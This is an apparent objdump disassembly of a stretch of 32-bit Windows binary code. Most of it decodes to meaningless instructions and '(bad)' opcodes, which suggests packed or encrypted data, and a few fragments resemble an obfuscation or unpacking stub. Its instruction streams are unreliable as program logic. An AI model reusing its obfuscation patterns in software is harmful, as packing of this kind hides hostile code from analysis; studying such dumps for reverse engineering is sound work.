  403107:	adc    ebp,DWORD PTR [ebx+0x53]
  40310a:	sar    BYTE PTR [edi+0x5c84fd6],0x5d
  403111:	clc    
  403112:	mov    ecx,0x136efe1c
  403117:	inc    eax
  403118:	aad    0xb3
  40311a:	jl     0x40309c
  40311c:	cmp    esp,ebx
  40311e:	adc    BYTE PTR [ebp-0x61],al
  403121:	inc    di
  403123:	add    dh,0xaa
  403126:	jmp    0xb04e71d7
  40312b:	fmul   QWORD PTR [edx-0x3571ab74]
  403131:	push   es
  403132:	jo     0x403144
  403134:	inc    esp
  403135:	ins    DWORD PTR es:[edi],dx
  403136:	ficomp DWORD PTR [ecx+0x500e814f]
  40313c:	sbb    edx,ecx
  40313e:	rcr    edi,1
  403140:	call   0x4188edae
  403145:	imul   ebx,ebp,0x4317d1b
  40314b:	out    dx,al
  40314c:	add    cl,BYTE PTR [eax]
  40314e:	aaa    
  40314f:	push   es
  403150:	inc    ecx
  403151:	sub    ebp,DWORD PTR [eax+edx*8+0x49]
  403155:	xor    al,0xfe
  403157:	sar    DWORD PTR [ecx+0x1c],1
  40315a:	hlt    
  40315b:	xchg   esp,eax
  40315c:	jb     0x40315c
  40315e:	push   0xe191f9b1
  403163:	sub    eax,0x239627b2
  403168:	out    dx,eax
  403169:	dec    esp
  40316a:	retf   
  40316b:	pusha  
  40316c:	xchg   ebx,eax
  40316d:	out    0x3c,al
  40316f:	mov    ss,WORD PTR [edi-0x6d]
  403172:	loopne 0x4031a2
  403174:	out    0xb4,al
  403176:	push   ebp
  403177:	leave  
  403178:	inc    esi
  403179:	ins    BYTE PTR es:[edi],dx
  40317a:	sub    esp,0x9b664dd
  403180:	or     BYTE PTR [esi+0x2],0x92
  403184:	jb     0x40317f
  403186:	jg     0x403155
  403188:	not    DWORD PTR [ebx-0x62]
  40318b:	push   edx
  40318c:	loope  0x403146
  40318e:	fisub  WORD PTR [eax+0x78]
  403191:	mov    edx,0x79eb6217
  403196:	les    ecx,FWORD PTR [edx+0x31]
  403199:	mov    edx,0xeccb67d4
  40319e:	js     0x403162
  4031a0:	les    esp,FWORD PTR [ebx-0x6b]
  4031a3:	outs   dx,BYTE PTR ds:[esi]
  4031a4:	sbb    ebx,DWORD PTR [edi-0x4a]
  4031a7:	arpl   WORD PTR [edx+0x48],bx
  4031aa:	lahf   
  4031ab:	push   edi
  4031ac:	lods   eax,DWORD PTR ds:[esi]
  4031ae:	sbb    eax,0xc10243d2
  4031b3:	fisub  DWORD PTR [esi+0x617f3f43]
  4031b9:	jo     0x403189
  4031bb:	out    0x93,al
  4031bd:	xor    dh,0xe5
  4031c0:	sbb    BYTE PTR [ecx-0x7a],0x6
  4031c4:	sbb    al,0x62
  4031c6:	mov    BYTE PTR [ecx],0x1d
  4031c9:	and    DWORD PTR [ebx+0x69],ebx
  4031cc:	xchg   ecx,eax
  4031cd:	jp     0x4031a3
  4031cf:	jmp    ebp
  4031d1:	sub    cl,bl
  4031d3:	jb     0x40323a
  4031d5:	jmp    esp
  4031d7:	mov    ebx,0xb1b2b07e
  4031dc:	pop    ecx
  4031dd:	push   es
  4031de:	outs   dx,BYTE PTR ds:[esi]
  4031df:	dec    edx
  4031e0:	cmp    eax,0xb5695a11
  4031e5:	bound  esi,QWORD PTR [eax+0x608258b6]
  4031eb:	mov    esi,eax
  4031ed:	gs pop esp
  4031ef:	sub    al,0x7b
  4031f1:	div    BYTE PTR [ebx+0x22]
  4031f4:	push   0xffffffc0
  4031f6:	imul   edi,DWORD PTR [edi],0x6d41639e
  4031fc:	xlat   BYTE PTR ds:[ebx]
  4031fd:	ficomp WORD PTR [eax-0x73e09977]
  403203:	sahf   
  403204:	int    0x14
  403206:	jo     0x40326e
  403208:	jmp    0x403256
  40320a:	or     al,0xc0
  40320c:	mul    eax
  40320e:	cmp    BYTE PTR [ebx-0x6d71237b],bl
  403214:	add    BYTE PTR [ecx-0x38a1ed47],cl
  40321a:	sbb    edx,DWORD PTR [ebx]
  40321c:	ret    
  40321d:	inc    edx
  40321e:	or     dh,BYTE PTR [edx+0x22]
  403221:	es mov al,0x5
  403224:	iret   
  403225:	scas   eax,DWORD PTR es:[edi]
  403226:	push   0x71
  403228:	adc    eax,0x7db27c4c
  40322d:	aaa    
  40322e:	adc    eax,0x6a88e70
  403233:	stc    
  403234:	add    eax,0xb86ecd03
  403239:	xchg   BYTE PTR [edx],ah
  40323b:	bound  ecx,QWORD PTR [esi]
  40323d:	into   
  40323e:	(bad)  
  40323f:	jge    0x4031fb
  403241:	(bad)  
  403242:	in     eax,dx
  403243:	lahf   
  403244:	push   0xcc8b7b54
  403249:	inc    ebp
  40324a:	ret    
  40324b:	pop    ecx
  40324c:	add    al,0x3b
  40324e:	rcl    DWORD PTR [edx],0xf4
  403251:	push   es
  403252:	jmp    0x1d9b969
  403257:	xor    BYTE PTR [ecx+0x3a],dl
  40325a:	sbb    DWORD PTR [ebp+0x11],0x5f9e45c3
  403261:	(bad)  
  403262:	jg     0x4031f9
  403264:	sub    ebp,DWORD PTR [eax]
  403266:	(bad)  ds:0x2616ec83
  40326c:	loop   0x4032d0
  40326e:	mov    esi,ebp
  403270:	push   esp
  403271:	dec    ecx
  403272:	test   BYTE PTR [edx],dh
  403274:	mov    ch,0xb1
  403276:	xor    cl,BYTE PTR [edi]
  403278:	ds jp  0x403266
  40327b:	neg    DWORD PTR [ebx]
  40327d:	dec    eax
  40327f:	and    DWORD PTR [esi+edx*4+0x20],edi
  403283:	mov    ch,0xca
  403285:	popf   
  403286:	xabort 0x63
  403289:	push   esp
  40328a:	pop    es
  40328b:	jmp    0x70b6:0xc7792d8d
  403292:	stos   BYTE PTR es:[edi],al
  403293:	push   ds
  403294:	adc    eax,0xc9655786
  403299:	push   ds
  40329a:	sbb    cl,ah
  40329c:	and    esi,DWORD PTR gs:[eax]
  40329f:	jne    0x40331b
  4032a1:	push   0xffffffa2
  4032a3:	fidiv  WORD PTR [ebp-0x25df3aa6]
  4032a9:	int3   
  4032aa:	out    0x82,al
  4032ac:	jecxz  0x403259
  4032ae:	pop    ebp
  4032af:	fs icebp 
  4032b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032b2:	int    0x8e
  4032b4:	sub    al,0x84
  4032b6:	(bad)
  4032ba:	xor    BYTE PTR [ecx+0x50],ah
  4032bd:	into   
  4032be:	fdivr  QWORD PTR [eax-0x39]
  4032c1:	cmp    al,0xa4
  4032c3:	nop
  4032c4:	push   ebp
  4032c5:	rcl    BYTE PTR [edx+0x298c4bae],0x67
  4032cc:	es push 0xbe897b17
  4032d2:	pop    esp
  4032d3:	int    0xa9
  4032d5:	cmp    bh,cl
  4032d7:	jae    0x4032f9
  4032d9:	cwde   
  4032da:	adc    al,0x1d
  4032dc:	(bad)  
  4032dd:	fisub  DWORD PTR [eax-0x50]
  4032e0:	mov    ds:0x46386952,eax
  4032e5:	cld    
  4032e6:	hlt    
  4032e7:	dec    esp
  4032e8:	jmp    0x40335d
  4032ea:	jne    0x403274
  4032ec:	out    dx,eax
  4032ed:	push   ebp
  4032ee:	ret    0x3570
  4032f1:	scas   eax,DWORD PTR es:[edi]
  4032f2:	das    
  4032f3:	aad    0xbc
  4032f5:	or     eax,0x23268932
  4032fa:	ins    DWORD PTR es:[edi],dx
  4032fb:	sar    ch,cl
  4032fd:	xchg   ebp,eax
  4032fe:	adc    DWORD PTR [eax-0x57e40743],0xffffffac
  403305:	adc    ecx,DWORD PTR [edx]
  403307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403308:	sti    
  403309:	adc    edi,DWORD PTR [esi+ebx*2-0x2c]
  40330d:	bound  edi,QWORD PTR [ecx+ebp*2]
  403310:	push   eax
  403311:	cmc    
  403312:	pop    esi
  403313:	jns    0x403311
  403315:	lds    esi,FWORD PTR [ecx+0x24]
  403318:	sub    DWORD PTR [edi-0xbd2b15f],esp
  40331e:	push   ds
  40331f:	adc    dh,al
  403321:	mov    ebx,0x5a333403
  403326:	jge    0x403312
  403328:	mov    al,0x20
  40332a:	mov    al,0x8
  40332c:	add    BYTE PTR cs:[edi+0x12],al
  403330:	xchg   esi,eax
  403331:	cmp    eax,0x61a7765b
  403336:	adc    al,bl
  403338:	loope  0x403302
  40333a:	or     bh,BYTE PTR [edx-0xf]
  40333d:	pop    eax
  40333e:	mov    ch,0x4f
  403340:	cli    
  403341:	ret    0x2ebf
  403344:	idiv   DWORD PTR [eax-0x20]
  403347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403348:	push   ebp
  403349:	int3   
  40334a:	in     eax,0x3f
  40334c:	sbb    DWORD PTR [ecx],edi
  40334e:	adc    al,0x86
  403350:	mov    edi,0x567e5382
  403355:	fisubr DWORD PTR [esi-0x78]
  403358:	sar    DWORD PTR [ebx-0x71],1
  40335b:	iret   
  40335c:	retf   0x1243
  40335f:	cwde   
  403360:	out    dx,al
  403361:	sub    ebx,esi
  403363:	outs   dx,DWORD PTR ds:[esi]
  403364:	fimul  DWORD PTR [ecx]
  403366:	mov    dh,0x46
  403368:	mov    esi,0xc96dce4f
  40336d:	mov    ds:0x8023d1f8,eax
  403372:	std    
  403373:	mov    edi,0xa0d84fed
  403379:	mov    BYTE PTR [ecx+0x7c],dh
  40337c:	and    eax,0xaeed6dd4
  403381:	adc    al,BYTE PTR [eax]
  403383:	sar    bh,0x7
  403386:	mov    esp,0x5c53364e
  40338b:	cmp    eax,0x78f090c9
  403390:	je     0x4033cc
  403392:	add    ecx,DWORD PTR [edx+0x2a323d4d]
  403398:	xor    al,BYTE PTR [eax]
  40339a:	imul   ecx,DWORD PTR [ebx-0x50f0f78b],0xfffffffa
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	fwait
  4033ba:	sbb    BYTE PTR [ecx+0x23],dl
  4033bd:	cmp    dl,BYTE PTR [eax+esi*2]
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x4033ad
  4033c6:	out    0xde,al
  4033c8:	mov    cl,BYTE PTR [esi]
  4033ca:	rol    BYTE PTR [edi],0x68
  4033cd:	rcl    DWORD PTR [eax],cl
  4033cf:	fs mov edx,0x6b5574a3
  4033d5:	in     eax,dx
  4033d6:	jns    0x4033e6
  4033d8:	(bad)  [eax+0x4d851eaf]
  4033de:	cmp    eax,0xebdd7388
  4033e3:	into   
  4033e4:	call   0xc732:0xea08aef4
  4033eb:	cwde   
  4033ec:	and    ch,BYTE PTR [edi]
  4033ee:	inc    ecx
  4033ef:	xchg   ebx,eax
  4033f0:	mov    eax,0x7821f8aa
  4033f5:	fadd   DWORD PTR [ebx+0x2d]
  4033f8:	mov    edx,DWORD PTR [esi+ebx*2+0x6]
  4033fc:	mov    eax,0x7988082d
  403401:	sub    BYTE PTR fs:[edx-0x3],ah
  403405:	jg     0x403468
  403407:	dec    esi
  403408:	mov    DWORD PTR [edi-0x7ca8a135],esp
  40340e:	(bad)  
  40340f:	retf   
  403410:	fist   DWORD PTR [edi-0x11]
  403413:	jle    0x40346b
  403415:	in     al,0xd
  403417:	dec    ebp
  403418:	scas   al,BYTE PTR es:[edi]
  403419:	enter  0x5985,0xcb
  40341d:	test   DWORD PTR [ebp-0x17ef1d19],esp
  403423:	clc    
  403424:	sbb    eax,0x65cde8d1
  403429:	mov    cl,0x90
  40342b:	repz mov eax,0x302dc829
  403431:	nop
  403432:	xlat   BYTE PTR ds:[ebx]
  403433:	sti    
  403434:	stc    
  403435:	and    al,0xc6
  403437:	sahf   
  403438:	es psllw mm5,mm1
  40343c:	rcr    BYTE PTR [ecx],cl
  40343e:	sti    
  40343f:	inc    edx
  403440:	aas    
  403441:	jp     0x40340c
  403443:	(bad)  
  403444:	xor    al,0x5f
  403446:	and    al,0x84
  403448:	pop    ebp
  403449:	in     al,dx
  40344a:	shl    BYTE PTR [eax],cl
  40344c:	mov    dh,0x36
  40344e:	and    dl,cl
  403450:	ja     0x4033f9
  403452:	jecxz  0x403457
  403454:	cs pop eax
  403456:	mov    ds:0x3c43e745,al
  40345b:	xor    dl,BYTE PTR [eax-0x3e]
  40345e:	mov    ecx,0x32c6134d
  403463:	xor    ecx,esi
  403465:	gs jmp FWORD PTR ds:[edx-0x73700e1a]
  40346d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40346e:	nop
  40346f:	xchg   DWORD PTR [edi+0x44],ecx
  403472:	xchg   esi,eax
  403473:	fdiv   st(7),st
  403475:	push   0xaf54e4e7
  40347a:	aam    0x4d
  40347c:	fldcw  WORD PTR [esi-0x29]
  40347f:	xor    BYTE PTR [ebx-0x5d],0xcf
  403483:	mov    DWORD PTR [ebx+ebp*2-0xc829b3a],ebp
  40348a:	add    esi,DWORD PTR [edi]
  40348c:	jo     0x403477
  40348e:	clc    
  40348f:	sbb    ebp,DWORD PTR [edi]
  403491:	mov    ds:0x61068f52,al
  403496:	pop    ebx
  403497:	jne    0x403493
  403499:	xchg   ebx,eax
  40349a:	fs adc dl,cl
  40349d:	call   0x297847c8
  4034a2:	mov    ?,WORD PTR [ecx-0x74]
  4034a5:	mov    eax,0x4126c9ac
  4034aa:	nop
  4034ab:	fsubr  QWORD PTR ds:0xcd17bcdb
  4034b1:	stc    
  4034b2:	fwait
  4034b3:	test   eax,0xbcd40251
  4034b8:	mov    edi,0x117abcb6
  4034bd:	add    cl,BYTE PTR [ebx-0x16e5ae24]
  4034c3:	mov    eax,0xb6a91b29
  4034c8:	sbb    ah,BYTE PTR [ebp-0x6f]
  4034cb:	sar    DWORD PTR [ebp+eiz*8-0x3ed0fbcb],1
  4034d2:	xchg   esi,eax
  4034d3:	sub    ebx,ebp
  4034d5:	or     eax,0x9b647851
  4034da:	bound  ebp,QWORD PTR [edx+0x4ac3709e]
  4034e0:	das    
  4034e1:	push   eax
  4034e2:	retf   
  4034e3:	push   ebx
  4034e4:	clc    
  4034e5:	and    bh,BYTE PTR [edi]
  4034e7:	sbb    BYTE PTR [esi+0x50a71e5d],ah
  4034ed:	aad    0xd7
  4034ef:	cs addr16 ret 
  4034f2:	(bad)  
  4034f3:	xor    BYTE PTR [ebp-0x7a],dl
  4034f6:	inc    ebp
  4034f7:	inc    ebx
  4034f8:	xchg   ebp,eax
  4034f9:	mov    BYTE PTR [eax+0x20937660],dl
  4034ff:	rol    BYTE PTR [edx],1
  403501:	adc    ecx,DWORD PTR [ecx+0x1a7d0b82]
  403507:	mov    ah,0xa9
  403509:	sbb    esp,esp
  40350b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40350d:	mov    ebx,0x223fae4a
  403512:	test   BYTE PTR [eax-0xe],dh
  403515:	inc    esi
  403516:	or     al,0x96
  403518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403519:	enter  0xf5b8,0xa9
  40351d:	call   0xf070ce7c
  403522:	add    BYTE PTR [ebx],al
  403524:	sti    
  403525:	loopne 0x403544
  403527:	cmp    dl,BYTE PTR [edi-0x41]
  40352a:	push   ebp
  40352b:	call   0xff99:0xe663021
  403532:	stos   DWORD PTR es:[edi],eax
  403533:	inc    DWORD PTR [edi]
  403535:	push   edi
  403536:	data16 loopne 0x4034f2
  403539:	es stos BYTE PTR es:[edi],al
  40353b:	mov    eax,0x80ee8772
  403540:	mov    eax,0xe4febddc
  403545:	xchg   DWORD PTR [eax],edx
  403547:	adc    ch,ah
  403549:	jb     0x403565
  40354b:	pop    ds
  40354c:	cmp    esi,DWORD PTR [esi-0xf]
  40354f:	stos   BYTE PTR es:[edi],al
  403550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403551:	sti    
  403552:	mov    DWORD PTR [ebp-0x4bc67040],ebp
  403558:	or     al,0x47
  40355a:	add    ebx,DWORD PTR [edi+0x6f]
  40355d:	cmp    al,0x84
  40355f:	retf   
  403560:	out    0x33,al
  403562:	ds xchg esi,eax
  403564:	mov    BYTE PTR [ebp+0x7e],0x3
  403568:	inc    esi
  403569:	adc    al,al
  40356b:	xor    bh,BYTE PTR [ebx+0x40]
  40356e:	dec    esi
  40356f:	inc    edx
  403570:	pop    esi
  403571:	das    
  403572:	push   0x7139cbfc
  403577:	lds    ebp,FWORD PTR [eax+0x79]
  40357a:	hlt    
  40357b:	std    
  40357c:	or     al,0x37
  40357e:	lock sub DWORD PTR ds:[esi+0x19f77de5],esp
  403586:	cmp    eax,0x69ea79d9
  40358b:	xor    dl,BYTE PTR [esi-0x7d]
  40358e:	xor    DWORD PTR [ebx],eax
  403590:	or     DWORD PTR [ecx-0xa371124],0x1
  403597:	daa    
  403598:	lock sub DWORD PTR [edi+ebx*1+0x77],ecx
  40359d:	and    dh,BYTE PTR [edi-0x28191fe0]
  4035a3:	sbb    DWORD PTR [eax+ebp*4+0x2ff96a45],esi
  4035aa:	fisttp QWORD PTR [edi-0x14]
  4035ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035af:	in     al,0x91
  4035b1:	and    BYTE PTR [ebx-0x22],al
  4035b4:	xchg   BYTE PTR [ebx+ebp*8+0x3453f328],ah
  4035bb:	inc    ebx
  4035bc:	xor    bl,BYTE PTR [ebp+ebp*4-0x2c]
  4035c0:	mov    WORD PTR [eax+0x6a],?
  4035c3:	in     al,dx
  4035c4:	mov    bh,dh
  4035c6:	mov    ch,dl
  4035c8:	ret    
  4035c9:	sub    ch,ah
  4035cb:	aad    0x1f
  4035cd:	push   cs
  4035ce:	and    esi,DWORD PTR [esi+0xa803f70]
  4035d4:	shr    DWORD PTR [ebx+0x2546395b],cl
  4035da:	or     esi,DWORD PTR [ecx-0x344243e9]
  4035e0:	scas   eax,DWORD PTR es:[edi]
  4035e1:	and    dl,dl
  4035e3:	push   ecx
  4035e4:	test   DWORD PTR [eax-0x21],ecx
  4035e7:	push   edi
  4035e8:	jge    0x40362b
  4035ea:	scas   eax,DWORD PTR es:[edi]
  4035eb:	xor    cl,bh
  4035ed:	sbb    DWORD PTR [edi+0x2d],0xd2c01c6e
  4035f4:	push   ebx
  4035f5:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4035f7:	add    bl,BYTE PTR gs:[ecx+0x732ac903]
  4035fe:	popf   
  4035ff:	inc    esi
  403600:	adc    BYTE PTR [esi],0xf6
  403603:	xor    DWORD PTR fs:[ecx+ebx*4-0x1ae88e4c],esi
  40360b:	mov    dh,0x21
  40360d:	leave  
  40360e:	into   
  40360f:	xor    esi,DWORD PTR [ebx-0x23489185]
  403615:	aam    0xf9
  403617:	clc    
  403618:	adc    BYTE PTR [ecx+0x7f62e079],bh
  40361e:	test   ch,bl
  403620:	aas    
  403621:	pop    edi
  403622:	inc    eax
  403623:	hlt    
  403624:	lods   al,BYTE PTR ds:[esi]
  403625:	sbb    eax,0xe9f6b19e
  40362a:	adc    DWORD PTR [edi+0x2c],esp
  40362d:	aas    
  40362e:	or     bl,BYTE PTR [edi+0x9e40f3e]
  403634:	je     0x4035e7
  403636:	sub    ecx,ebp
  403638:	test   esi,0x781b93f
  40363e:	stc    
  40363f:	out    0x2e,eax
  403641:	int    0xb7
  403643:	sbb    eax,0x357739b6
  403648:	pop    ebp
  403649:	inc    ebp
  40364a:	xchg   BYTE PTR [ebx+0x48753555],ch
  403650:	fnsave [ebx-0x67]
  403653:	push   esp
  403654:	jnp    0x4036c7
  403656:	dec    esp
  403657:	stc    
  403658:	popf   
  403659:	pop    esi
  40365a:	shr    BYTE PTR [edx-0x5d3d7ac0],cl
  403660:	fs jp  0x403695
  403663:	adc    edx,eax
  403665:	pop    esi
  403666:	lods   al,BYTE PTR ds:[esi]
  403667:	xchg   DWORD PTR [esi],edi
  403669:	cwde   
  40366a:	mov    al,ds:0xe2621fd9
  40366f:	cmp    esp,esi
  403671:	jmp    0xcaa10ce
  403676:	ds mov eax,0x33844c7a
  40367c:	arpl   WORD PTR [edx],di
  40367e:	out    0x90,eax
  403680:	xchg   eax,edi
  403682:	dec    ebp
  403683:	mov    ch,BYTE PTR [ecx-0x7b756ca5]
  403689:	add    ebx,DWORD PTR [edx+esi*2+0x4880032]
  403690:	aaa    
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fd6d,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fd6d,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fd6d,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e357
  4036fc:	cmp    DWORD PTR ds:0x42fd6d,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fd6d
  403711:	dec    eax
  403712:	mov    ds:0x42fd6d,eax
  403717:	mov    eax,ds:0x42fd6d
  40371c:	dec    eax
  40371d:	mov    ds:0x42fd6d,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e773,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e777,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd8d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e793,0x42e19c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fdfa,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e1a4,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e78f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [ecx+0x78f54e33],ebx
  4037a6:	adc    DWORD PTR [eax+0x70],esi
  4037a9:	cmp    eax,0xa470707d
  4037ae:	ret    
  4037af:	dec    eax
  4037b0:	xor    BYTE PTR [edx+esi*2-0x2e9aa235],0x35
  4037b8:	jge    0x403762
  4037ba:	jecxz  0x403795
  4037bc:	shl    BYTE PTR [edx+ecx*1-0x181966fe],1
  4037c3:	or     eax,0xfe585b16
  4037c8:	push   ds
  4037c9:	jp     0x4037ae
  4037cb:	mov    ch,0xc8
  4037cd:	jmp    0xe0f82a66
  4037d2:	push   edx
  4037d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037d4:	xchg   esp,eax
  4037d5:	add    DWORD PTR [edx-0x67],edx
  4037d8:	pop    ebp
  4037d9:	xchg   BYTE PTR [esi-0x20c3f4e0],bh
  4037df:	repnz shr DWORD PTR [eax+0x4ab93284],0x99
  4037e7:	shr    DWORD PTR [edi-0x3e26fe5e],cl
  4037ed:	and    al,0x14
  4037ef:	or     bh,BYTE PTR [edx]
  4037f1:	adc    DWORD PTR [edi+esi*1],eax
  4037f4:	cmp    DWORD PTR [ebx-0x29],ebp
  4037f7:	pop    ebx
  4037f8:	xchg   ebx,eax
  4037f9:	dec    ebp
  4037fa:	push   es
  4037fb:	or     esi,DWORD PTR [eax-0x25adbd24]
  403801:	cmp    eax,0xcd883281
  403806:	dec    esp
  403807:	ins    DWORD PTR es:[edi],dx
  403808:	jae    0x4037d8
  40380a:	push   0x57eb29b1
  40380f:	or     eax,0x6bd719f0
  403814:	and    ebx,DWORD PTR [ebx]
  403816:	sbb    dh,0x74
  403819:	int    0xae
  40381b:	nop
  40381c:	mov    dh,0x7a
  40381e:	mov    bh,0xc9
  403820:	rol    ecx,0x23
  403823:	ret    
  403824:	nop
  403825:	js     0x403809
  403827:	cli    
  403828:	push   0x80e60a9c
  40382d:	sti    
  40382e:	sub    ebx,DWORD PTR fs:[esi+0x3b54bc0a]
  403835:	retf   
  403836:	pop    eax
  403837:	push   0xffffffc3
  403839:	mov    ch,0x82
  40383b:	push   ecx
  40383c:	loopne 0x4037c4
  40383e:	xor    eax,ebp
  403840:	xchg   DWORD PTR [eax],ebp
  403842:	or     ebx,DWORD PTR [edi+0x4e94c5f5]
  403848:	icebp  
  403849:	std    
  40384a:	loopne 0x403891
  40384c:	mov    ch,0xc1
  40384e:	hlt    
  40384f:	int    0xe3
  403851:	repnz adc dh,BYTE PTR [edx+eax*2]
  403855:	lock add ah,al
  403858:	jns    0x403867
  40385a:	sbb    eax,0x9a241294
  40385f:	adc    BYTE PTR [esi+0x5e],dl
  403862:	(bad)  
  403863:	xchg   esp,eax
  403864:	push   ebp
  403865:	(bad)  [ecx-0x11]
  403868:	mov    ds:0xb9dab75f,al
  40386d:	pop    esi
  40386e:	mov    bh,0x68
  403870:	inc    esp
  403871:	and    esp,eax
  403873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403874:	je     0x4038c1
  403876:	test   ch,bh
  403878:	outs   dx,BYTE PTR ds:[esi]
  403879:	nop
  40387a:	retf   
  40387b:	or     DWORD PTR [eax-0x1e],edi
  40387e:	mov    bl,BYTE PTR [edi]
  403880:	mov    eax,ds:0x2c068ccd
  403885:	dec    edx
  403886:	ins    BYTE PTR es:[edi],dx
  403887:	adc    ecx,DWORD PTR [eax]
  403889:	gs adc bl,ch
  40388c:	shl    DWORD PTR [esi+ecx*2],0x21
  403890:	mov    bl,0x9f
  403892:	jl     0x40384b
  403894:	pop    ebx
  403895:	ret    0xad94
  403898:	cwde   
  403899:	sub    ch,BYTE PTR [eax]
  40389b:	iret   
  40389c:	je     0x4038cb
  40389e:	push   esi
  40389f:	int3   
  4038a0:	loopne 0x403903
  4038a2:	stc    
  4038a3:	push   edi
  4038a4:	repnz ror DWORD PTR [esi],1
  4038a7:	rcl    DWORD PTR [esi+esi*2+0x5882198c],cl
  4038ae:	xchg   ebx,eax
  4038af:	imul   esp,ebx,0x78
  4038b2:	cmp    edx,0x1f
  4038b5:	xor    DWORD PTR [ecx+0x62],esi
  4038b8:	jmp    0x4038e1
  4038ba:	aaa    
  4038bb:	xchg   esp,eax
  4038bc:	cmp    edi,DWORD PTR [edx+0x3d4c71b2]
  4038c2:	sti    
  4038c3:	sub    BYTE PTR [ebp+edx*8+0x5132d267],dl
  4038ca:	pushf  
  4038cb:	mov    al,0x28
  4038cd:	push   0xc18cdf44
  4038d2:	es int 0x62
  4038d5:	popf   
  4038d6:	cmp    al,0x8c
  4038d8:	out    dx,al
  4038d9:	dec    ebx
  4038da:	push   eax
  4038db:	sub    DWORD PTR [esi-0x6eb3b19a],esi
  4038e1:	aad    0x97
  4038e3:	mov    BYTE PTR [ebp+0x5f],ch
  4038e6:	mov    bl,0xaf
  4038e8:	jae    0x403952
  4038ea:	or     DWORD PTR [ecx-0x3a9a3c9a],ecx
  4038f0:	sbb    al,0x37
  4038f2:	cdq    
  4038f3:	xor    BYTE PTR [edi+edx*1+0x29b1aafd],ah
  4038fa:	fsub   DWORD PTR [eax-0x7cc4fd88]
  403900:	and    edx,0x15256614
  403906:	cdq    
  403907:	loopne 0x4038e5
  403909:	or     bh,dl
  40390b:	xchg   edx,eax
  40390c:	jle    0x403946
  40390e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40390f:	add    bl,BYTE PTR [edi]
  403911:	pop    edx
  403912:	and    eax,0xef6c5ca2
  403917:	or     BYTE PTR [ebp-0x6a],ch
  40391a:	pop    edx
  40391b:	das    
  40391c:	lahf   
  40391d:	loop   0x4038bf
  40391f:	aam    0xb9
  403921:	cmp    cl,dh
  403923:	dec    ecx
  403924:	in     eax,dx
  403925:	repnz dec edx
  403927:	and    BYTE PTR [edi+ecx*1],0xda
  40392b:	xchg   BYTE PTR [eax],ch
  40392d:	into   
  40392e:	pop    ebx
  40392f:	xchg   DWORD PTR ds:0x8ee31551,ebp
  403935:	dec    ebp
  403936:	jecxz  0x403938
  403938:	cld    
  403939:	stos   DWORD PTR es:[edi],eax
  40393a:	mov    bl,0x7b
  40393c:	sbb    ebx,0xf85edfc3
  403942:	in     eax,0x66
  403944:	fimul  WORD PTR [esi-0x41]
  403947:	aaa    
  403948:	(bad)  
  403949:	jg     0x4038fe
  40394b:	add    eax,0x82a30114
  403950:	jmp    FWORD PTR [ebx]
  403952:	inc    ebp
  403953:	scas   al,BYTE PTR es:[edi]
  403954:	out    0xfa,eax
  403956:	cmp    al,0xe
  403958:	cmp    BYTE PTR [ebx+0x2b0d9bc9],ah
